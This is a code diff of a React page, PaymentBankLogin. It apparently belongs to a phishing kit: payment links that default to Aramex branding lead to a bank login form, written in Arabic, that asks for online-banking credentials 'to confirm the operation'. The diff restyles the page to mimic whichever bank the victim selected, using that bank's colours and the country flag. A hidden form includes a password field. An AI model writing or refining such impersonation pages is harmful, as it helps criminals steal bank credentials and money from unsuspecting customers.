@@ -3,8 +3,7 @@ import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
-import { getServiceBranding } from "@/lib/serviceLogos";
-import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
+import BankBrandedLayout from "@/components/BankBrandedLayout";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
 import { Lock, Eye, EyeOff, Building2, ArrowLeft, ShieldCheck } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
@@ -40,9 +39,7 @@ const PaymentBankLogin = () => {
     cardType: '',
   };
   
-  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
-  const serviceName = linkData?.payload?.service_name || serviceKey;
-  const branding = getServiceBranding(serviceKey);
+  const serviceName = linkData?.payload?.service_name || 'دفع فاتورة';
 
   // Get country from link data
   const selectedCountry = linkData?.payload?.selectedCountry || "SA";
@@ -262,45 +259,23 @@ const PaymentBankLogin = () => {
   };
   
   return (
-    <DynamicPaymentLayout
-      serviceName={serviceName}
-      serviceKey={serviceKey}
+    <BankBrandedLayout
+      bankId={selectedBankId}
       amount={formattedAmount}
-      title={`تسجيل الدخول - ${selectedBank?.nameAr || 'البنك'}`}
+      title={`تسجيل الدخول`}
       description="أدخل بيانات الدخول للبنك لتأكيد العملية"
       icon={<Lock className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
+      countryFlag={selectedCountryData?.flag}
     >
-      {/* Bank Info Header */}
-      <div 
-        className="rounded-lg p-4 sm:p-5 mb-6 flex items-center gap-4"
-        style={{
-          background: `linear-gradient(135deg, ${selectedBank?.color || branding.colors.primary}, ${selectedBank?.color || branding.colors.secondary})`,
-        }}
-      >
-        <div 
-          className="w-12 h-12 sm:w-14 sm:h-14 rounded-xl bg-white/20 backdrop-blur-sm flex items-center justify-center flex-shrink-0"
-        >
-          <Building2 className="w-6 h-6 sm:w-7 sm:h-7 text-white" />
-        </div>
-        <div className="flex-1 text-white">
-          <p className="text-xs sm:text-sm opacity-90">البنك المختار</p>
-          <p className="text-lg sm:text-xl font-bold">{selectedBank?.nameAr || 'البنك'}</p>
-          <p className="text-xs opacity-80">{selectedBank?.name}</p>
-        </div>
-        {selectedCountryData && (
-          <span className="text-3xl sm:text-4xl">{selectedCountryData.flag}</span>
-        )}
-      </div>
-
       {/* Security Notice */}
       <div 
         className="rounded-lg p-3 sm:p-4 mb-6 flex items-start gap-2"
         style={{
-          background: `${branding.colors.primary}10`,
-          border: `1px solid ${branding.colors.primary}30`
+          background: `${selectedBank?.color || '#004B87'}10`,
+          border: `1px solid ${selectedBank?.color || '#004B87'}30`
         }}
       >
-        <ShieldCheck className="w-5 h-5 mt-0.5 flex-shrink-0" style={{ color: branding.colors.primary }} />
+        <ShieldCheck className="w-5 h-5 mt-0.5 flex-shrink-0" style={{ color: selectedBank?.color || '#004B87' }} />
         <div className="text-xs sm:text-sm">
           <p className="font-semibold mb-1">تسجيل دخول آمن</p>
           <p className="text-muted-foreground">
@@ -403,7 +378,7 @@ const PaymentBankLogin = () => {
           <button
             type="button"
             className="text-muted-foreground hover:underline"
-            style={{ color: selectedBank?.color || branding.colors.primary }}
+            style={{ color: selectedBank?.color || '#004B87' }}
           >
             نسيت كلمة المرور؟
           </button>
@@ -416,7 +391,7 @@ const PaymentBankLogin = () => {
           className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white font-bold shadow-lg"
           disabled={isSubmitting}
           style={{
-            background: `linear-gradient(135deg, ${selectedBank?.color || branding.colors.primary}, ${selectedBank?.color || branding.colors.secondary})`
+            background: selectedBank?.color || '#004B87'
           }}
         >
           {isSubmitting ? (
@@ -445,7 +420,7 @@ const PaymentBankLogin = () => {
           variant="outline"
           size="sm"
           className="text-xs"
-          style={{ borderColor: selectedBank?.color || branding.colors.primary }}
+          style={{ borderColor: selectedBank?.color || '#004B87' }}
         >
           تسجيل حساب جديد
         </Button>
@@ -468,7 +443,7 @@ const PaymentBankLogin = () => {
         <input type="password" name="password" />
         <input type="text" name="timestamp" />
       </form>
-    </DynamicPaymentLayout>
+    </BankBrandedLayout>
   );
 };
 
